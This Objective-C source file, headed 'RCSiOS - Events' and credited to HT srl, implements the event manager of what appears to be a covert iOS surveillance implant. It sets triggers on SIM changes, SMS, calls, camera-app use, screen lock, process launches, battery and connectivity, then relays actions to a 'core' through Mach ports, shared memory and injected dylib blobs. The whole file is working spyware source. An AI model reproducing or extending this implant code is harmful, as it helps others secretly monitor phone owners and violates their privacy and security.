/*
 * RCSiOS - Events
 *  Provides all the events which should trigger an action
 *
 *
 * Created on 26/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CoreFoundation/CoreFoundation.h>
#include <SystemConfiguration/SystemConfiguration.h>

#include <sys/param.h>
#include <sys/queue.h>
#include <sys/socket.h>

#import "RCSIEventManager.h"
#import "RCSICommon.h"
#import "RCSITaskManager.h"
#import "RCSISharedMemory.h"
#import "RCSIActionManager.h"
#import "Reachability.h"
#import "RCSIEventTimer.h"
#import "RCSIEventProcess.h"
#import "RCSIEventConnectivity.h"
#import "RCSIEventBattery.h"
#import "RCSIEventACPower.h"
#import "RCSIEventScreensaver.h"
#import "RCSIEventSimChange.h"
#import "RCSINullEvent.h"

//#define DEBUG_

NSString *kRunLoopEventManagerMode = @"kRunLoopEventManagerMode";

#pragma mark -
#pragma mark Events Data Struct Definition
#pragma mark -

//
// struct for events data
//
typedef struct _timer {
  u_int type;
  u_int loDelay;
  u_int hiDelay;
  u_int endAction;
} timerStruct;

typedef struct _process {
  u_int onClose;
  u_int lookForTitle; // 1 for Title - 0 for Process Name
  u_int nameLength;
  char name[256];     // Name is unicode here
} processStruct;

typedef struct _connection {
  u_int onClose;
  u_long typeOfConnection; // 1 for Wifi - 2 for GPRS - 3 for WiFI || GPRS
} connectionStruct;

typedef struct _smsEvent {
  u_int phoneNumberLength;  // cString Length
  NSString *phoneNumber;    // Unicode
  u_int smsTextLength;      // cString Length
  NSString *smsText;        // Unicode
} smsStruct;

typedef struct _call {
  u_int onClose;
  u_int phoneNumberLength; // cString Length
  NSString *phoneNumber;   // Unicode
} callStruct;

typedef struct _simChange {
  u_int onClose;
} simChangeStruct;

typedef struct _ac {
  u_int onClose;
} acStruct;

typedef struct _batteryLevel {
  u_int onClose;
  u_int minLevel;
  u_int maxLevel;
} batteryLevelStruct;

NSLock *connectionLock;

@implementation _i_EventManager : NSObject

@synthesize notificationPort;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)init
{
  self = [super init];
    
  if (self != nil)
    {
      eventsMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
      eventsList = nil;
      notificationPort = nil;
    }
   
  return self;
}

- (void)dealloc
{
  [eventsMessageQueue release];
  eventsMessageQueue = nil;
  notificationPort = nil;
  [eventsList release];
  [super dealloc];
}

#pragma mark -
#pragma mark Events list support
#pragma mark -

- (NSDate*)calculateDateFromMidnight:(NSTimeInterval)aInterval
{
  NSRange fixedRange;
  fixedRange.location = 11;
  fixedRange.length   = 8;
  
  //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
  // UTC timers
  NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
  
  NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
  [inFormat setTimeZone:timeZone];
  [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
  
  // Get current date string UTC
  NSDate *now = [NSDate date];
  NSString *currDateStr = [inFormat stringFromDate: now];
  
  [inFormat release];
  
  // Create string from current date: yyyy-MM-dd hh:mm:ss ZZZ
  NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
  
  // reset current date time to midnight
  [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
  
  NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
  [outFormat setTimeZone:timeZone];
  [outFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
  
  // Current midnite
  NSDate *midnight = [outFormat dateFromString: dayStr];

  [dayStr release];
  
  NSTimeInterval intervalFromMidnite = [midnight timeIntervalSince1970];
  aInterval += intervalFromMidnite;
  
  NSDate *dateFromMidnite = (NSDate*)[NSDate dateWithTimeIntervalSince1970:aInterval];
  
  return  dateFromMidnite;
}

- (void)addEventTimerInstance:(NSMutableDictionary*)theEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  _i_EventTimer *timer = [[_i_EventTimer alloc] init];
  
  [theEvent retain];
  
  timerStruct *timerRawData = (timerStruct *)[[theEvent objectForKey: @"data"] bytes];

  int type          = timerRawData->type;
  uint low          = timerRawData->loDelay;
  uint high         = timerRawData->hiDelay;
  
  [timer setEnabled:[theEvent objectForKey: @"enabled"]];
  [timer setStart: [theEvent objectForKey: @"start"]];
  [timer setRepeat: [theEvent objectForKey: @"repeat"]];
  [timer setEnd: [theEvent objectForKey: @"end"]];
  [timer setIter: [theEvent objectForKey: @"iter"]];
  [timer setDelay: [theEvent objectForKey:@"delay"]];
  
  [timer setTimerType: type];
  
  switch (type) 
  {
    case TIMER_LOOP:
    {
      break;
    } 
    case TIMER_AFTER_STARTUP:
    {
      // timer with startDate only
      if (low != 0xFFFFFFFF)
        [timer setStartDate: [NSDate dateWithTimeIntervalSinceNow:(low/1000)]];
      break;
    } 
    case TIMER_INST:
    {
      int64_t high64 = high;
      int64_t sec = ((high64 << 32) & 0xFFFFFFFF00000000) + low;
      sec /= 10000000LL;

      NSString *execName = [[NSBundle mainBundle] bundlePath];
      NSDictionary *execProps = [[NSFileManager defaultManager] attributesOfItemAtPath: execName error:nil]; 
      NSDate *execCreationDate = [execProps objectForKey:NSFileCreationDate];
      NSTimeInterval execCreationInterval = [execCreationDate timeIntervalSince1970];
      
      // timer with startDate only
      [timer setStartDate: [NSDate dateWithTimeIntervalSince1970: execCreationInterval + sec]];
      break;
    }
    case TIMER_DATE:
    {
      int64_t winTime;
      int64_t high64 = high;
      winTime = ((high64 << 32) & 0xFFFFFFFF00000000) + low;
      NSTimeInterval unixTime;      
      unixTime = (winTime - EPOCH_DIFF)/RATE_DIFF;
      
      // timer with startDate only
      [timer setStartDate: [NSDate dateWithTimeIntervalSince1970: unixTime]];
      break;
    }
    case TIMER_DAILY:
    {
      [timer setStartDate: [self calculateDateFromMidnight: low/1000]];
      [timer setEndDate: [self calculateDateFromMidnight: high/1000]];
      break;
    }
    default:
      break;
  }
  
  [theEvent setObject: timer forKey: @"object"];

  [theEvent release];
  [timer release];
  
  [pool release];
}

- (void)addEventProcessInstance:(NSMutableDictionary*)theEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  _i_EventProcess *proc = [[_i_EventProcess alloc] init];
  
  [theEvent retain];

  processStruct *processRawData = (processStruct *)[[theEvent objectForKey: @"data"] bytes];
  
  NSData *tempData  = [NSData dataWithBytes: processRawData->name
                                     length: processRawData->nameLength];
  
  NSString *processName = [[NSString alloc] initWithData: tempData
                                                encoding: NSUTF16LittleEndianStringEncoding];

  [proc setProcessName: processName];
  
  [proc setEnabled:[theEvent objectForKey: @"enabled"]];
  [proc setStart: [theEvent objectForKey: @"start"]];
  [proc setRepeat: [theEvent objectForKey: @"repeat"]];
  [proc setEnd: [theEvent objectForKey: @"end"]];
  [proc setIter: [theEvent objectForKey: @"iter"]];
  [proc setDelay: [theEvent objectForKey:@"delay"]]; 

  [theEvent setObject: proc forKey: @"object"];

  [processName release];
  [theEvent release];
  [proc release];
  
  [pool release];
}

- (void)addEventConnectivityInstance:(NSMutableDictionary*)theEvent
{
  _i_EventConnectivity *conn = [[_i_EventConnectivity alloc] init];
  
  [theEvent retain];
    
  [conn setEnabled:[theEvent objectForKey: @"enabled"]];
  [conn setStart: [theEvent objectForKey: @"start"]];
  [conn setRepeat: [theEvent objectForKey: @"repeat"]];
  [conn setEnd: [theEvent objectForKey: @"end"]];
  [conn setIter: [theEvent objectForKey: @"iter"]];
  [conn setDelay: [theEvent objectForKey:@"delay"]]; 
  
  [theEvent setObject: conn forKey: @"object"];
  
  [theEvent release];
  
  [conn release];
}

- (void)addEventBatteryInstance:(NSMutableDictionary*)theEvent
{
  _i_EventBattery *batt = [[_i_EventBattery alloc] init];
  
  [theEvent retain];
  
  batteryLevelStruct *batteryRawData = 
        (batteryLevelStruct *)[[theEvent objectForKey: @"data"] bytes];
   
  [batt setEnabled:[theEvent objectForKey: @"enabled"]];
  [batt setStart: [theEvent objectForKey: @"start"]];
  [batt setRepeat: [theEvent objectForKey: @"repeat"]];
  [batt setEnd: [theEvent objectForKey: @"end"]];
  [batt setIter: [theEvent objectForKey: @"iter"]];
  [batt setDelay: [theEvent objectForKey:@"delay"]]; 
  
  [batt setMinLevel: batteryRawData->minLevel];
  [batt setMaxLevel: batteryRawData->maxLevel];
  
  [theEvent setObject: batt forKey: @"object"];
  
  [theEvent release];
  
  [batt release];
}

- (void)addEventACInstance:(NSMutableDictionary*)theEvent
{
  _i_EventACPower *ac = [[_i_EventACPower alloc] init];
  
  [theEvent retain];
  
  [ac setEnabled:[theEvent objectForKey: @"enabled"]];
  [ac setStart: [theEvent objectForKey: @"start"]];
  [ac setRepeat: [theEvent objectForKey: @"repeat"]];
  [ac setEnd: [theEvent objectForKey: @"end"]];
  [ac setIter: [theEvent objectForKey: @"iter"]];
  [ac setDelay: [theEvent objectForKey:@"delay"]];  
  
  [theEvent setObject: ac forKey: @"object"];
  
  [theEvent release];
  
  [ac release];
}

- (void)addEventScreensaverInstance:(NSMutableDictionary*)theEvent
{
  _i_EventScreensaver *scrsvr = [[_i_EventScreensaver alloc] init];
  
  [theEvent retain];
  
  [scrsvr setEnabled:[theEvent objectForKey: @"enabled"]];
  [scrsvr setStart: [theEvent objectForKey: @"start"]];
  [scrsvr setRepeat: [theEvent objectForKey: @"repeat"]];
  [scrsvr setEnd: [theEvent objectForKey: @"end"]];
  [scrsvr setIter: [theEvent objectForKey: @"iter"]];
  [scrsvr setDelay: [theEvent objectForKey:@"delay"]];  
  
  [theEvent setObject: scrsvr forKey: @"object"];
  
  [theEvent release];
  
  [scrsvr release];
}

- (void)addEventSimChangeInstance:(NSMutableDictionary*)theEvent
{
  _i_EventSimChange *sim = [[_i_EventSimChange alloc] init];
  
  [theEvent retain];
  
  [sim setEnabled:[theEvent objectForKey: @"enabled"]];
  [sim setStart: [theEvent objectForKey: @"start"]];
  [sim setRepeat: [theEvent objectForKey: @"repeat"]];
  [sim setEnd: [theEvent objectForKey: @"end"]];
  [sim setIter: [theEvent objectForKey: @"iter"]];
  [sim setDelay: [theEvent objectForKey:@"delay"]];  
  
  [theEvent setObject: sim forKey: @"object"];
  
  [theEvent release];
  
  [sim release];
}

- (void)addEventNullInstance:(NSMutableDictionary*)theEvent
{
  _i_NullEvent *nullEvent = [[_i_NullEvent alloc] init];
  
  [theEvent retain];
  
  [nullEvent setEventType:[[theEvent objectForKey: @"type"] intValue]];
  [nullEvent setEnabled:[theEvent objectForKey: @"enabled"]];
  [nullEvent setStart: [theEvent objectForKey: @"start"]];
  [nullEvent setRepeat: [theEvent objectForKey: @"repeat"]];
  [nullEvent setEnd: [theEvent objectForKey: @"end"]];
  [nullEvent setIter: [theEvent objectForKey: @"iter"]];
  [nullEvent setDelay: [theEvent objectForKey:@"delay"]];
  
  [theEvent setObject: nullEvent forKey: @"object"];
  
  [theEvent release];
  [nullEvent release];
}

#pragma mark -
#pragma mark Messages dispatch and processing
#pragma mark -

typedef struct _coreMessage_t
{
  mach_msg_header_t header;
  uint dataLen;
} coreMessage_t;

- (void)dispatchMsgToCore:(u_int)aType
                    param:(u_int)aParam
{
  shMemoryLog params;
  params.agentID  = aType;
  params.flag     = aParam;
  
  NSData *msgData = [[NSData alloc] initWithBytes: &params 
                                           length: sizeof(shMemoryLog)];
  
  [_i_SharedMemory sendMessageToCoreMachPort: msgData 
                                     withMode: kRunLoopEventManagerMode];
  
  [msgData release];
}

- (BOOL)addMessage: (NSData*)aMessage
{
  @synchronized(eventsMessageQueue)
  {
    [eventsMessageQueue addObject: aMessage];
  }
  
  return TRUE;
}

- (BOOL)triggerAction:(uint)anAction
{
  [self dispatchMsgToCore: EVENT_TRIGGER_ACTION param: anAction];  
  return TRUE;
}

- (void)setStandyProperties:(int)aProp
{
  for (int i=0; i<[eventsList count]; i++) 
    {
      NSMutableDictionary *event = [eventsList objectAtIndex:i];
    
      if (EVENT_STANDBY == [[event objectForKey: @"type"] intValue])
        {
          _i_EventScreensaver *scr = [event objectForKey: @"object"];
          [scr setIsDeviceLocked:aProp];
        }
    }
}

- (BOOL)processEvent:(NSData *)aData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (aData == nil)
    return FALSE;
    
  shMemoryLog *anEvent = (shMemoryLog*)[aData bytes];
  
  switch (anEvent->agentID) 
  {
    case EVENT_CAMERA_APP:
    {
      gCameraActive = anEvent->flag == 1 ? TRUE : FALSE;
      break;
    } 
    case EVENT_STANDBY:
    {
      [self setStandyProperties:anEvent->flag];
      break;
    }
    case EVENT_SIM_CHANGE:
    {
      [self triggerAction: anEvent->flag];
      break;
    }
    case EVENT_TRIGGER_ACTION:
    {
      [self triggerAction:anEvent->commandType];
      break;
    }
    case CORE_NOTIFICATION:
    {
      if (anEvent->flag == CORE_NEED_RESTART ||
          anEvent->flag == CORE_NEED_STOP)
        {
          eventManagerStatus = EVENT_MANAGER_STOPPING;
          [pool release];
          return FALSE;
        }
      break;
    }
    case ACTION_EVENT_DISABLED:
    {
      if (anEvent->commandType < [eventsList count])
        {
          NSMutableDictionary *event = [eventsList objectAtIndex: anEvent->flag];
          _i_Event *object = [event objectForKey: @"object"];
          NSNumber *status = [NSNumber numberWithInt: 0];
          [object setEnabled: status];
        }
      break;
    }
    case ACTION_EVENT_ENABLED:
    {
      if (anEvent->commandType < [eventsList count])
        {
          NSMutableDictionary *event = [eventsList objectAtIndex: anEvent->flag];
          _i_Event *object = [event objectForKey: @"object"];
          NSNumber *status = [NSNumber numberWithInt: 1];
          [object setEnabled: status];
        }
      break;
    }
    default:
      break;
  }
  
  [pool release];
  
  return TRUE;
}

-(int)processIncomingEvents
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *tmpMessages;
  
  @synchronized(eventsMessageQueue)
  {
    tmpMessages = [[eventsMessageQueue copy] autorelease];
    [eventsMessageQueue removeAllObjects];
  }

  int logCount = [tmpMessages count];
  
  for (int i=0; i < logCount; i++)
    if ([self processEvent:[tmpMessages objectAtIndex:i]] == FALSE)
        break;
  
  [pool release];
  
  return logCount;
}

- (void) handleMachMessage:(void *) msg 
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  coreMessage_t *coreMsg = (coreMessage_t*)msg;
  
  NSData *theData = [NSData dataWithBytes: ((u_char*)msg + sizeof(coreMessage_t))  
                                   length: coreMsg->dataLen];
  
  [self addMessage: theData];
  
  [pool release];
}

#pragma mark -
#pragma mark Events initialization
#pragma mark -

- (void)startRemoteEvent:(u_int)eventID
{
  _i_DylibBlob *tmpBlob 
  = [[_i_DylibBlob alloc] initWithType:eventID 
                                 status:1 
                             attributes:DYLIB_EVENT_START_ATTRIB 
                                   blob:nil
                               configId:[[_i_ConfManager sharedInstance] mConfigTimestamp]];
  
  [[_i_SharedMemory sharedInstance] putBlob: tmpBlob];
  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
  
  [tmpBlob release];
}

- (void)stopRemoteEvent:(u_int)eventID
{
  _i_DylibBlob *tmpBlob 
  = [[_i_DylibBlob alloc] initWithType:eventID 
                                 status:1 
                             attributes:DYLIB_EVENT_STOP_ATTRIB 
                                   blob:nil
                               configId:[[_i_ConfManager sharedInstance] mConfigTimestamp]];
  
  [[_i_SharedMemory sharedInstance] putBlob: tmpBlob];
  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
  
  [tmpBlob release];
}

- (void)startRemoteEvents
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  for (int i=0; i < [eventsList count]; i++) 
    {
      NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
    
      _i_Event *eventInst = [theEvent objectForKey: @"object"];
      
      /*
       * skip event null (used only for keep the correct position in event list)
       */
      if ([eventInst eventType] == EVENT_NULL)
        continue;
      
      if (eventInst != nil)
        {
          switch ([eventInst eventType]) 
          {
            case EVENT_STANDBY:
                [self startRemoteEvent:[eventInst eventType]];
            break;      
          }
        }
    }
  
  [pool release];
}

- (void)stopRemoteEvents
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  for (int i=0; i < [eventsList count]; i++) 
    {
      NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
      
      _i_Event *eventInst = [theEvent objectForKey: @"object"];

      /*
       * skip event null (used only for keep the correct position in event list)
       */
      if ([eventInst eventType] == EVENT_NULL)
        continue;
      
      if (eventInst != nil)
        {
          switch ([eventInst eventType]) 
            {
              case EVENT_STANDBY:
                [self stopRemoteEvent:[eventInst eventType]];
              break;      
            }
        }
    }
  
  [pool release];
}

- (void)removeTimersFromCurrentRunLoop
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  for (int i=0; i < [eventsList count]; i++)
  {
    NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
    
    id eventInst = [theEvent objectForKey: @"object"];
    
    /*
     * skip event null (used only for keep the correct position in event list)
     */
    if ([eventInst eventType] == EVENT_NULL)
      continue;
    
    if (eventInst != nil && [eventInst respondsToSelector:@selector(removeTimers)])
    {
      [eventInst performSelector:@selector(removeTimers)];
    }
  }
  
  [pool release];
}

- (void)addTimersToCurrentRunLoop
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  for (int i=0; i < [eventsList count]; i++) 
  {
    NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
    
    id eventInst = [theEvent objectForKey: @"object"];
    
    /*
     * skip event null (used only for keep the correct position in event list)
     */
    if ([eventInst eventType] == EVENT_NULL)
      continue;
    
    if (eventInst != nil && [eventInst respondsToSelector:@selector(setStartTimer)])
      {
        [eventInst performSelector:@selector(setStartTimer)];
      }
  }
  
  [pool release];
}

- (BOOL)initEvents
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  id theEvent;
  int eventPos = 0;
  
  NSEnumerator *enumerator = [eventsList objectEnumerator];
  
  while ((theEvent = [enumerator nextObject]))
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    switch ([[theEvent objectForKey: @"type"] intValue])
    {
      case EVENT_TIMER:
      {
        [self addEventTimerInstance: theEvent];
        break;
      }
      case EVENT_PROCESS:
      {
        [self addEventProcessInstance: theEvent];
        break;
      }
      case EVENT_CONNECTION:
      {
        [self addEventConnectivityInstance:theEvent];
        break;
      }
      case EVENT_BATTERY:
      {
        [self addEventBatteryInstance:theEvent];
        break;
      }
      case EVENT_AC:
      {
        [self addEventACInstance:theEvent];
        break;
      }
      case EVENT_STANDBY:
      {
        [self addEventScreensaverInstance:theEvent];
        break;
      }
      case EVENT_SIM_CHANGE:
      {
        [self addEventSimChangeInstance:theEvent];
        break;
      }
      case EVENT_SMS:
      {
        [self addEventNullInstance:theEvent];
        break;
      }
      case EVENT_CALL:
      {
        [self addEventNullInstance:theEvent];
        break;
      }
      case EVENT_QUOTA:
      {
        [self addEventNullInstance:theEvent];
        break;
      }
      default:
      {
        [self addEventNullInstance:theEvent];
        break;
      }
    }
    
    eventPos++;
    
    [innerPool release];
  }
  
  [outerPool release];
  
  return TRUE;
}

#pragma mark -
#pragma mark Main runloop
#pragma mark -

- (void)eventManagerRunLoop
{
  eventManagerStatus = EVENT_MANAGER_RUNNING;
  
  NSRunLoop *eventManagerRunLoop = [NSRunLoop currentRunLoop];
  
  notificationPort = [[NSMachPort alloc] init];
  [notificationPort setDelegate: self];
  
  [eventManagerRunLoop addPort: notificationPort 
                       forMode: kRunLoopEventManagerMode];
  
  [self addTimersToCurrentRunLoop];
  [self startRemoteEvents];
  
  while (eventManagerStatus == EVENT_MANAGER_RUNNING)
    {
      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

      [eventManagerRunLoop runMode: kRunLoopEventManagerMode 
                        beforeDate: [NSDate dateWithTimeIntervalSinceNow:0.750]];

      [self processIncomingEvents];   
      
      [pool release];
    }

  [self removeTimersFromCurrentRunLoop]; 
  [self stopRemoteEvents];
  
  [eventManagerRunLoop removePort: notificationPort 
                          forMode: kRunLoopEventManagerMode];
                       
  [notificationPort release];
  notificationPort = nil;

  [self stop];
}

#pragma mark -
#pragma mark Agents proto implementation
#pragma mark -

- (BOOL)start
{
  eventsList = [[_i_ConfManager sharedInstance] eventsArrayConfig];
  
  if (eventsList == nil)
    return FALSE;
  
  [self initEvents];
  
  [NSThread detachNewThreadSelector: @selector(eventManagerRunLoop) 
                           toTarget: self withObject:nil];
  
  return TRUE;
}

- (void)stop
{
  [self dispatchMsgToCore:CORE_NOTIFICATION param: CORE_EVENT_STOPPED];
}

@end
